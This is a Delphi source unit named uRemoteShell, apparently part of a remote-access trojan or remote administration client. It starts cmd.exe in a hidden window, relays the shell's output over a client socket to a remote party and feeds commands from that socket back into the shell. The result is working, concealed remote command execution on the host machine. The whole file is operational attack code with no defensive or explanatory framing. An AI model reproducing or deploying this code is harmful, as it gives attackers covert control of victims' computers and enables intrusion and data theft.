unit uRemoteShell;

interface
uses socketunit,classes, Windows, uCommands;

var
  CMDSocket:TClientSocket;
  CMDBuffer:TMemoryStream;
  lCMDThreadID:Cardinal;

procedure StartCMDThread(sSock:TClientsocket);
procedure RemoteShellWriteData(sStr:string);
implementation
uses uConnection;

procedure ShellThread(p:pointer);stdcall;
const
  MAX_CHUNK: dword = 8191;
var
  hiRead, hoRead, hiWrite, hoWrite: THandle;
  Buffer: array [0..8191] of byte;
  SecurityAttributes: SECURITY_ATTRIBUTES;
  StartupInfo: TSTARTUPINFO;
  ProcessInfo: TProcessInformation;
  BytesRead, BytesWritten, ExitCode, PipeMode: dword;
  mySocket:TClientSocket;
  strOutput:String;
begin
  mySocket := CMDSocket;
  SendPacket(mySocket,PACK_SHELLSTART,'');
  SecurityAttributes.nLength := SizeOf(SECURITY_ATTRIBUTES);
  SecurityAttributes.lpSecurityDescriptor := nil;
  SecurityAttributes.bInheritHandle := True;
  CreatePipe(hiRead, hiWrite, @SecurityAttributes, 0);
  CreatePipe(hoRead, hoWrite, @SecurityAttributes, 0);
  GetStartupInfo(StartupInfo);
  StartupInfo.hStdOutput := hoWrite;
  StartupInfo.hStdError := hoWrite;
  StartupInfo.hStdInput := hiRead;
  StartupInfo.dwFlags := STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;
  StartupInfo.wShowWindow := SW_HIDE;
  CreateProcess(nil, 'cmd', nil, nil, True, CREATE_NEW_CONSOLE, nil, nil, StartupInfo, ProcessInfo);
  CloseHandle(hoWrite);
  CloseHandle(hiRead);
  PipeMode := PIPE_NOWAIT;
  SetNamedPipeHandleState(hoRead, PipeMode , nil, nil);
  while 1 = 1 do
  begin
    Sleep(100);
    GetExitCodeProcess(ProcessInfo.hProcess, ExitCode);
    if ExitCode <> STILL_ACTIVE then Break;
    ReadFile(hoRead, Buffer, MAX_CHUNK, BytesRead, nil);
    if BytesRead > 0 then
    begin
      SetLength(strOutput,BytesRead);
      MoveMemory(@strOutput[1],@Buffer,BytesRead);
      If SendPacket(mySocket,PACK_SHELLDATA,strOutput) = false then break;
      zeromemory(@buffer,sizeof(buffer));
    end;
    Sleep(100);
    try
      if CmdBuffer.Size > 0 then
      begin
        WriteFile(hiWrite, CmdBuffer.Memory^, CmdBuffer.Size, BytesWritten, nil);
      end;
    finally
      CmdBuffer.Clear;
    end;
  end;
  GetExitCodeProcess(ProcessInfo.hProcess, ExitCode);
  if ExitCode = STILL_ACTIVE then TerminateProcess(ProcessInfo.hProcess, 0);
  CloseHandle(hoRead);
  CloseHandle(hiWrite);
  SendPacket(mySocket,PACK_SHELLSTOP,'');
end;

procedure StartCMDThread(sSock:TClientsocket);
begin
  CMDSocket := ssock;
  CmdBuffer := TMemorystream.Create;
  cmdbuffer.Clear;
  createthread(nil,0,@shellthread,nil,0,lCMDThreadID);
end;

procedure RemoteShellWriteData(sStr:string);
begin
  if cmdbuffer = nil then exit;
  cmdbuffer.Clear;
  cmdbuffer.Write(sStr[1],length(sStr));
end;
end.
